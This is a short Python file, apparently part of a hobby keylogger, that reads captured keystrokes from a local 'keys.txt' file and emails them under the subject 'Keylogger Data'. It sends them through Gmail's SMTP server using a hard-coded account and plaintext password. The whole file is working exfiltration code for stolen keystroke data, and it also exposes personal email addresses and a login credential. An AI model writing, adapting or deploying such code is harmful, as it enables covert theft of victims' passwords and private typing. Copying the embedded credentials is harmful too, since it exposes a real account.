import smtplib

sent_from = "ritickcodes@gmail.com"
sent_to = "ritickmadaan56@gmail.com"
email_message = ""


def create_message():
    global email_message
    file = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "r")

    subject = "Keylogger Data"
    body = file.read()
    file.close()

    email_message = """\
    From: %s
    To: %s
    Subject: %s

    %s""" % (sent_from, sent_to, subject, body)


def mail():

    global email_message
    create_message()
    # try:
    # port no 465 is used for gmail
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.ehlo()
    server.login("ritickcodes@gmail.com", "temporarypasswordforcoding@123")
    server.sendmail(sent_from, sent_to, email_message)
    print("Mail Sent")
    server.close()
    # except:
    #     print("Something went wrong")
